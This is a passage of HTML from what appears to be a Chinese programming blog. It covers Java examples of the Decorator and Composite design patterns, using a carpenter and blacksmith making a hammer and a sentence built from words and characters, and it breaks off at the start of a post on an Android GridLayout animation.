class="line"></span><br><span class="line">  <span class="meta">@Override</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">chekcAfter</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    LOGGER.info(<span class="string">"检查成品锤把"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>由于某些原因，铁匠决定自己制作锤把，现在铁匠身兼双职，将木匠的工作也承担了。定义一个铁匠操作类 HammerSmith<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 铁匠</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HammerSmithOperation</span> <span class="keyword">implements</span> <span class="title">Operation</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Logger LOGGER = LoggerFactory.getLogger(HammerSmithOperation.class);</span><br><span class="line">  <span class="keyword">private</span> Operation previousOperation;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="title">HammerSmithOperation</span><span class="params">(Operation previousOperation)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.previousOperation = previousOperation;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="meta">@Override</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">checkBefore</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    previousOperation.checkBefore();</span><br><span class="line">    LOGGER.info(<span class="string">"检查铁材"</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="meta">@Override</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">join</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    previousOperation.join();</span><br><span class="line">    LOGGER.info(<span class="string">"打造锤头"</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="meta">@Override</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">chekcAfter</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    previousOperation.chekcAfter();</span><br><span class="line">    LOGGER.info(<span class="string">"检查成品锤头"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>同样实现了“操作”的接口，铁匠的每个操作都包含了木匠相应的操作，相当于对木匠的操作增加了一层包裹和扩展。这种包装就是 Decorator 模式中的装饰。</p>
+<p>现在分别让木匠和铁匠进行一系列操作<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Decorator</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Application</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Logger LOGGER = LoggerFactory.getLogger(Application.class);</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">    LOGGER.info(<span class="string">"仅由木匠制作锤把"</span>);</span><br><span class="line">    Operation carpenter = <span class="keyword">new</span> CarpenterOperation();</span><br><span class="line">    carpenter.checkBefore();</span><br><span class="line">    carpenter.join();</span><br><span class="line">    carpenter.chekcAfter();</span><br><span class="line"></span><br><span class="line">    LOGGER.info(<span class="string">"由铁匠完成锤把以及锤头的制作"</span>);</span><br><span class="line">    Operation hammerSmith = <span class="keyword">new</span> HammerSmithOperation(carpenter);</span><br><span class="line">    hammerSmith.checkBefore();</span><br><span class="line">    hammerSmith.join();</span><br><span class="line">    hammerSmith.chekcAfter();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>输出如下内容<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">仅由木匠制作锤把</span><br><span class="line">检查木材</span><br><span class="line">打造锤把</span><br><span class="line">检查成品锤把</span><br><span class="line"></span><br><span class="line">由铁匠完成锤把以及锤头的制作</span><br><span class="line">检查木材</span><br><span class="line">检查铁材</span><br><span class="line">打造锤把</span><br><span class="line">打造锤头</span><br><span class="line">检查成品锤把</span><br><span class="line">检查成品锤头</span><br></pre></td></tr></table></figure></p>
+<h2 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h2><h3 id="优点"><a href="#优点" class="headerlink" title="优点"></a>优点</h3><ol>
+<li>装饰模式和静态继承的机制的作用都是对现有的类增加新的功能，但装饰模式有着比静态继承更灵活的组合方式。装饰模式可以在运行的时候决定需要增加还是去除一种“装饰”以及什么“装饰”。静态继承则没有这样的灵活性，它对类功能的扩展是在运行之前就确定了的。</li>
+<li>得益于装饰模式在组合上的灵活性和便利性，我们可以将各种装饰类进行组合，从而较为简单的创造各种不同的行为集合，实现多种多样的功能。<h3 id="缺点"><a href="#缺点" class="headerlink" title="缺点"></a>缺点</h3></li>
+<li>装饰者的对象和它装饰的对象本质上是完全不同的，装饰模式会生成许多的对象，导致区分各种对象变得困难</li>
+<li>由于使用相同的标识，对于程序的理解和拍错过程的难度也会随之增加</li>
+</ol>
+<h2 id="开源项目"><a href="#开源项目" class="headerlink" title="开源项目"></a>开源项目</h2><p>有关其他模式本人的的开源项目：<br><a href="https://github.com/JamesZBL/java_design_patterns" target="_blank" rel="noopener">github.com/JamesZBL/java_design_patterns</a><br>如果觉得有用，欢迎 Star/Fork/提Issue<br>该项目目前处在开发阶段</p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="/2017/10/01/2017-10-01-面向对象软件设计模式-组合-Composite/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="摆码王子">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="James' Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2017/10/01/2017-10-01-面向对象软件设计模式-组合-Composite/" itemprop="url">面向对象软件设计模式-组合 Composite</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-10-01T12:12:00+08:00">
+                2017-10-01
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h2 id="用途"><a href="#用途" class="headerlink" title="用途"></a>用途</h2><p>将对象组合成树形结构以表示 “部分——整体” 的层次结构。</p>
+<p>Composite使得用户对单个对象和组合对象的使用具有一致性。</p>
+<h2 id="模式要点"><a href="#模式要点" class="headerlink" title="模式要点"></a>模式要点</h2><p><img src="https://user-gold-cdn.xitu.io/2017/11/19/15fd45454f35913c?w=984&amp;h=599&amp;f=png&amp;s=48305" alt=""></p>
+<h3 id="组成部分"><a href="#组成部分" class="headerlink" title="组成部分"></a>组成部分</h3><ul>
+<li>Component : 是组合中的所有对象的统一接口；定义了特定情况下，类应当实现的货缺省的行为；Component 声明一个接口用于访问和管理 Component 的子组件；在递归结构中定义一个接口，用于访问一个父部件，并符合条件的类中实现它，当然这个是可选的。</li>
+<li>Leaf：在组合中表示叶节点对象，顾名思义，叶节点没有子节点。</li>
+<li>Composite：定义有子部件的那些部件的行为，同时存储子部件，实现 Component 中与子部件有关的接口。</li>
+<li>Client：通过Component接口，操纵组合部件的对象。<h3 id="协作原理"><a href="#协作原理" class="headerlink" title="协作原理"></a>协作原理</h3></li>
+<li>用户使用Component类接口与组合结构中的对象进行交互。 如果接收者是一个叶节点，则直接处理请求。 如果接收者是Composite， 它通常将请求发送给它的子部件， 在转发请求之前与/或之后可能执行一些辅助操作。</li>
+</ul>
+<h2 id="实例分析"><a href="#实例分析" class="headerlink" title="实例分析"></a>实例分析</h2><p>在中文中，一句话是由词语组成的，而词语又由字组成；在英文中，句子由单词组成，而单词又由一个个字母组成。每个对象都可定义的它之前的或之后的内容。比如一个中文句子总是以句号结尾，一个英文单词之前通常是有空格的。这种结构可以形成了递归嵌套的结构，句子是父容器，单词是子容器，字母是叶节点。<br><img src="https://user-gold-cdn.xitu.io/2017/11/19/15fd453dc4bcfe14?w=1526&amp;h=376&amp;f=png&amp;s=39695" alt=""><br>CharacterComposite 是一个抽象类，定义了所有容器类或叶节点的接口，容器应当实现的功能有：获取子组件、对子组件进行计数、定义组件的格式化输出规则。Sentence(句子) 和 Word (单词)都属于容器，而 Character (字母)则属于叶节点，因为字母中无法再添加子组件了，它是层次结构中的最末端。<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 所有容器的抽象父类</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">CharacterComposite</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">private</span> List&lt;CharacterComposite&gt; children = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">add</span><span class="params">(CharacterComposite character)</span> </span>&#123;</span><br><span class="line">    children.add(character);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">count</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.children.size();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">printBefore</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">printAfter</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">print</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    printBefore();</span><br><span class="line">    <span class="keyword">for</span> (CharacterComposite item : children) &#123;</span><br><span class="line">      item.print();</span><br><span class="line">    &#125;</span><br><span class="line">    printAfter();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>EnglishWord 组件前应当输出一个空格，EnglishSentence 组件后应当输出一个“.”，ChineseSentence 组件后应当输出一个“。”等。<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 英文句子</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">EnglishSentence</span> <span class="keyword">extends</span> <span class="title">CharacterComposite</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="title">EnglishSentence</span><span class="params">(List&lt;EnglishWord&gt; words)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (EnglishWord word : words) &#123;</span><br><span class="line">      add(word);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="meta">@Override</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">printAfter</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    System.out.println(<span class="string">"."</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 英文单词</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">EnglishWord</span> <span class="keyword">extends</span> <span class="title">CharacterComposite</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="title">EnglishWord</span><span class="params">(List&lt;Character&gt; characters)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (Character c : characters) &#123;</span><br><span class="line">      add(c);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="meta">@Override</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">printBefore</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    System.out.print(<span class="string">" "</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>Word 作为 Sentence 的子容器，Character 作为 Word 的子组件，属于叶节点。<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 字母</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Character</span> <span class="keyword">extends</span> <span class="title">CharacterComposite</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">char</span> c;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="title">Character</span><span class="params">(<span class="keyword">char</span> c)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.c = c;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="meta">@Override</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">print</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    System.out.print(c);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>Writer 为句子生成器，各个组件及子组件均由它负责填充，最终形成一个完成的结构。<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 语句生成器</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Writer</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">public</span> CharacterComposite <span class="title">sentenceByChinese</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    List&lt;ChineseWord&gt; words = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line"></span><br><span class="line">    words.add(<span class="keyword">new</span> ChineseWord(Arrays.asList(<span class="keyword">new</span> Character(<span class="string">'我'</span>))));</span><br><span class="line">    words.add(<span class="keyword">new</span> ChineseWord(Arrays.asList(<span class="keyword">new</span> Character(<span class="string">'是'</span>))));</span><br><span class="line">    words.add(<span class="keyword">new</span> ChineseWord(Arrays.asList(<span class="keyword">new</span> Character(<span class="string">'来'</span>), <span class="keyword">new</span> Character(<span class="string">'自'</span>))));</span><br><span class="line">    words.add(<span class="keyword">new</span> ChineseWord(Arrays.asList(<span class="keyword">new</span> Character(<span class="string">'北'</span>), <span class="keyword">new</span> Character(<span class="string">'京'</span>))));</span><br><span class="line">    words.add(<span class="keyword">new</span> ChineseWord(Arrays.asList(<span class="keyword">new</span> Character(<span class="string">'的'</span>))));</span><br><span class="line">    words.add(<span class="keyword">new</span> ChineseWord(Arrays.asList(<span class="keyword">new</span> Character(<span class="string">'小'</span>), <span class="keyword">new</span> Character(<span class="string">'明'</span>))));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> ChineseSentence(words);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">public</span> CharacterComposite <span class="title">sentenceByEnglish</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    List&lt;EnglishWord&gt; words = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line"></span><br><span class="line">    words.add(<span class="keyword">new</span> EnglishWord(Arrays.asList(<span class="keyword">new</span> Character(<span class="string">'I'</span>))));</span><br><span class="line">    words.add(<span class="keyword">new</span> EnglishWord(Arrays.asList(<span class="keyword">new</span> Character(<span class="string">'a'</span>), <span class="keyword">new</span> Character(<span class="string">'m'</span>))));</span><br><span class="line">    words.add(<span class="keyword">new</span> EnglishWord(Arrays.asList(<span class="keyword">new</span> Character(<span class="string">'a'</span>))));</span><br><span class="line">    words.add(<span class="keyword">new</span> EnglishWord(Arrays.asList(<span class="keyword">new</span> Character(<span class="string">'s'</span>), <span class="keyword">new</span> Character(<span class="string">'t'</span>), <span class="keyword">new</span> Character(<span class="string">'u'</span>), <span class="keyword">new</span> Character(<span class="string">'d'</span>), <span class="keyword">new</span> Character(<span class="string">'e'</span>), <span class="keyword">new</span> Character(<span class="string">'n'</span>), <span class="keyword">new</span> Character(<span class="string">'t'</span>))));</span><br><span class="line">    words.add(<span class="keyword">new</span> EnglishWord(Arrays.asList(<span class="keyword">new</span> Character(<span class="string">'f'</span>), <span class="keyword">new</span> Character(<span class="string">'r'</span>), <span class="keyword">new</span> Character(<span class="string">'o'</span>), <span class="keyword">new</span> Character(<span class="string">'m'</span>))));</span><br><span class="line">    words.add(<span class="keyword">new</span> EnglishWord(Arrays.asList(<span class="keyword">new</span> Character(<span class="string">'L'</span>), <span class="keyword">new</span> Character(<span class="string">'o'</span>), <span class="keyword">new</span> Character(<span class="string">'n'</span>), <span class="keyword">new</span> Character(<span class="string">'d'</span>), <span class="keyword">new</span> Character(<span class="string">'o'</span>), <span class="keyword">new</span> Character(<span class="string">'n'</span>))));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> EnglishSentence(words);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<h2 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h2><ul>
+<li>Composite 模式定义了基本对象和组合对象的基本层次结构，基本对象可以组合形成更复杂的对象，这个对象还可以再次进行组合，依次类推，可以实现无限层的递归嵌套结构，上文中提到的句子-单词-字母结构即是如此。</li>
+<li>所有的容器都是这个接口的实现，用户可以一致地使用组合结构和单个对象，用户不需要知道它是否为叶节点或包含子容器的一个组件，从而大大简化了代码结构，定义组合的类时避免了各种复杂的包含着大量判断的方法。</li>
+<li>在增加新的组件的时候更简单，无论是新增一种容器或一个叶节点都很方便，无需单独再定义新类并且可以很容易和现有的组件或容器结合工作，客户端无需随新组件的增加而做任何改变</li>
+<li>使代码结构更具通用性，但也存在一些问题。增加组件很方便，但无法对子组件做过多的限制，即使客户希望在容器中只增加某种特定的组件，由于使用 Composite 而无法依靠别的类做过多的约束，这些检验类型的工作就要放到运行时去做了</li>
+</ul>
+<h2 id="适用场景"><a href="#适用场景" class="headerlink" title="适用场景"></a>适用场景</h2><ul>
+<li>你想表示对象的部分-整体层次结构</li>
+<li>你希望用户忽略组合对象与单个对象的不同， 用户将统一地使用组合结构中的所有对象</li>
+</ul>
+<h2 id="开源项目"><a href="#开源项目" class="headerlink" title="开源项目"></a>开源项目</h2><p>有关其他模式本人的的开源项目：<br><a href="https://github.com/JamesZBL/java_design_patterns" target="_blank" rel="noopener">Java 实现的面向对象软件设计模式</a><br>如果觉得有用，欢迎 Star/Fork/提Issue<br>该项目目前处在开发阶段</p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="/2017/06/15/2017-06-15-GridLayout + Animation 实现 Android 仿超级课程表“发现”全屏宫格图标弹出动画/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="摆码王子">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="James' Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2017/06/15/2017-06-15-GridLayout + Animation 实现 Android 仿超级课程表“发现”全屏宫格图标弹出动画/" itemprop="url">GridLayout + Animation 实现 Android 仿超级课程表“发现”全屏宫格图标弹出动画</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-06-15T22:41:00+08:00">
+                2017-06-15
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p><font size="3">关于</font><font size="6">全屏宫格图标</font><font size="3">，超级课程表的“发现”是目前我见过的最好的解决方案，流畅的动画打破了布局单一带来的死板气氛。下面就来介绍这样的动画是如何实现的。</font></p><p><br></p><p><font size="3">首先创建一个activity叫BiaoDiscoverActivity</font></p><p><font size="3">此处用到了Handler，<font style="NoForceAllFonts By Microsoft YaHei&quot;,HighLevelEmoji,&quot;Catcat520.Lite.Latin&quot;,&quot;SDF.TypeSetCtrlFonts&quot;,&quot;SDF.CnSymbol&quot;,&quot;SDF.EnSymbol&quot;,&quot;SDF.Number&quot;,此处填写英文字体,&quot;此处填写 font-family 的名称&quot;,&quot;Envy Code R&quot;,Inconsolata,&quot;Envy Code R&quot;,&quot;Open Sans&quot;,Roboto,&quot;Segoe UI&quot;,&quot;Helvetica Neue&quot;,&quot;Lucida Grande&quot;,Ubuntu,Tahoma,Verdana,Menlo,Monaco,此处填写中文字体,&quot;SDF.FixScTcFonts&quot;,&quot;SDF.Hangul&quot;,&quot;Microsoft YaHei&quot;,&quot;Microsoft YaHei&quot;,&quot;Microsoft JhengHei&quot;,&quot;Microsoft YaHei UI&quot;,&quot;Microsoft JhengHei UI&quot;,fp-font,AccessibilityFoundicons,&quot;Accessibility Foundicons&quot;,anchorjs-icons,brandico,Brandico,brankic1979,Brankic1979,&quot;brankic 1979&quot;,&quot;Brankic 1979&quot;,broccolidry,Broccolidry,bundlestars,chagaan,CONDENSEicon,cuticons,Cuticons,dashicons,duotai,duotai-status,&quot;Dot Com&quot;,ecoico,Ecoico,EightiesShades,ElegantIcons,elusive,Elusive,Elusive-Icons,entypo,Entypo,&quot;Entypo Social&quot;,Entypo-Social,&quot;Erler Dingbats&quot;,et-line,Et-line,FabricMDL2Icons,feedfont,fontawesome,FontAwesome,fontelico,Fontelico,fontello,Fontello,Garqag,GeneralEnclosedFoundicons,&quot;General Enclosed Foundicons&quot;,GeneralFoundicons,&quot;General Foundicons&quot;,Gibson,&quot;Gibson Light&quot;,gibson_lightbold,Gibson_lightbold,gibson_lightitalic,Gibson_lightitalic,gibsonregular,Gibsonregular,&quot;Glyphicons Halflings&quot;,&quot;GLYPHICONS Halflings&quot;,&quot;Heydings Controls&quot;,&quot;Heydings Icons&quot;,icft_temai,icft_temai_index,iconminia,Iconminia,iconvault,Iconvault,icomoon,Icomoon,iconfont,iconfont-tcl,iconic,Iconic,icons,Icons,ifanrx,iknow-qb_share_icons,&quot;Just Vector&quot;,JustVector,JustVectorRegular,LenovoSupport,linecons,Linecons,lobi-pc,LondonMM,londonmmregular,Londonmmregular,mainicon,maki,Maki,Mainicon,&quot;Material Icons Extended&quot;,Material-Design-Icons,MENKSOF0,Menksoft2007,Menksoft2012,MenksoftQagan,meteocons,Meteocons,MeteoconsRegular,mfglabs,Mfglabs,&quot;MFG Labs Iconset&quot;,mfg_labs_iconsetregular,Mfg_labs_iconsetregular,modernpics,Modernpics,&quot;Modern Pictograms&quot;,o365Icons,Office365Icons,&quot;OpenWeb Icons&quot;,PulsarJS,RaphaelIcons,rondo,Rondo,sellerCenter,sdp-icons,silkcons,Silkcons,SocialFoundicons,&quot;Social Foundicons&quot;,Socialico,&quot;Socialico Plus&quot;,&quot;Social Networking Icons&quot;,Sosa,&quot;Symbol Signs&quot;,&quot;Symbol Signs Basis set&quot;,typicons,Typicons,VideoJS,weathercons,Weathercons,websymbols,Websymbols,&quot;Web Symbols&quot;,&quot;Web Symbols Liga&quot;,wpzoom,Wpzoom,Yglyphs-legacy,youkuMobile,zocial,Zocial,&quot;PingFang SC&quot;,&quot;PingFang TC&quot;,&quot;PingFang 